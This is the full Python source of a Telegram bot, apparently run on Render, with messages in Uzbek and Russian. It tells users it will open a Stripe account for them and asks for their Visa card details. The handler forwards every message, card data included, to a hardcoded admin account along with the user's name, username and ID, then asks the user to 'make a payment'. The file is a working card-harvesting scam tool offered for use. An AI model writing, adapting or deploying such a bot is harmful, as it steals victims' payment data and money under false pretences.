import os
from flask import Flask, request
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

ADMIN_ID = 7594376654  # o'zingizning IDingiz

reply_keyboard = [['Ha', "Yo'q"]]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)

questions = [
    "🇺🇿 Assalomu alaykum! Stripe akkaunt ochish uchun bizga sizning Visa kartangiz kerak bo'ladi. Sizda Visa karta bormi?",
    "🇷🇺 Здравствуйте! Для открытия аккаунта Stripe нам нужна ваша карта Visa. У вас есть карта Visa?"
]

ask_card = [
    "🇺🇿 Iltimos, Visa kartangiz ma'lumotlarini yuboring:",
    "🇷🇺 Пожалуйста, отправьте данные вашей карты Visa:"
]

open_card = [
    "🇺🇿 Iltimos, avval Visa karta oching.",
    "🇷🇺 Пожалуйста, сначала откройте карту Visa."
]

card_received_message = [
    "🇺🇿 Rahmat! Sizning Visa karta ma'lumotlaringiz qabul qilindi:",
    "🇷🇺 Спасибо! Данные вашей карты Visa получены:"
]

admin_contact_message = [
    "🇺🇿 Iltimos, to'lovni amalga oshiring: Tez orada Admin siz bilan bog'lanadi.",
    "🇷🇺 Пожалуйста, произведите оплату: Вскоре Администратор свяжется с вами."
]

TOKEN = os.getenv("TOKEN")  # Renderdagi muhit o'zgaruvchisidan olamiz
bot = Bot(token=TOKEN)

app = Flask(__name__)

application = ApplicationBuilder().token(TOKEN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    context.user_data['lang_step'] = 0
    await update.message.reply_text("\n".join(questions), reply_markup=markup)

async def handle_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "Noma'lum"
    username = update.effective_user.username or "username yo'q"
    text = update.message.text

    if user_id == ADMIN_ID:
        if update.message.reply_to_message:
            original_message = update.message.reply_to_message.text
            if "Foydalanuvchi ID:" in original_message:
                lines = original_message.split('\n')
                for line in lines:
                    if "Foydalanuvchi ID:" in line:
                        target_user_id = int(line.split(': ')[1])
                        try:
                            await context.bot.send_message(
                                chat_id=target_user_id,
                                text=text
                            )
                            await update.message.reply_text("✅ Javob yuborildi!")
                        except Exception as e:
                            await update.message.reply_text(f"❌ Javob yuborishda xatolik: {e}")
                        return
        return

    admin_message = (
        f"🔔 Yangi xabar!\n\n"
        f"👤 Foydalanuvchi: {user_name}\n"
        f"📧 Username: @{username}\n"
        f"🆔 Foydalanuvchi ID: {user_id}\n"
        f"💬 Xabar: {text}"
    )

    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
    except Exception as e:
        print(f"Error sending message to admin: {e}")

    text_lower = text.lower()
    step = context.user_data.get('lang_step', 0)

    if step == 0:
        if text_lower not in ['ha', "yo'q", 'yoq']:
            await update.message.reply_text(
                "Iltimos, faqat 'Ha' yoki 'Yo‘q' deb javob bering.",
                reply_markup=markup
            )
            return

        if text_lower == 'ha':
            context.user_data['lang_step'] = 1
            await update.message.reply_text("\n".join(ask_card), reply_markup=ReplyKeyboardRemove())
        else:
            await update.message.reply_text("\n".join(open_card), reply_markup=ReplyKeyboardRemove())

    elif step == 1:
        visa_data = text
        context.user_data['visa_data'] = visa_data
        response_message = (
            f"{card_received_message[0]}\n{card_received_message[1]}\n\n"
            f"{visa_data}\n\n"
            f"{admin_contact_message[0]}\n{admin_contact_message[1]}"
        )
        await update.message.reply_text(response_message)

application.add_handler(CommandHandler("start", start))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_response))

@app.route(f"/{TOKEN}", methods=["POST"])
async def webhook():
    json_update = await request.get_json(force=True)
    update = Update.de_json(json_update, bot)
    await application.update_queue.put(update)
    return "OK"

@app.route("/")
def index():
    return "Bot ishlayapti", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
